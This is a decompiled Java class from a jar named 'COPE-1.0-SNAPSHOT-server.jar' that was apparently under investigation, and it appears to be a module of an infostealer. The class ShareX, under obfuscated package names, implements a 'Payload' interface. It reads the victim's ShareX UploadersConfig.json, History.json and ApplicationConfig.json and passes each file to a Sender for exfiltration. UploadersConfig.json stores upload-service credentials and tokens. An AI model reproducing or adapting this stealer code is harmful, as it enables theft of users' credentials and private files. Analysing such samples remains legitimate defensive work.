/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import idasido.adldaosd.wpiw.util.FileUtil;
/*    */ 
/*    */ 
/*    */ public final class ShareX
/*    */   implements Payload
/*    */ {
/*    */   public void execute() throws Exception {
/* 12 */     FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\UploadersConfig.json").ifPresent(Sender::send);
/* 13 */     FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\History.json").ifPresent(Sender::send);
/* 14 */     FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\ApplicationConfig.json").ifPresent(Sender::send);
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\ShareX.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */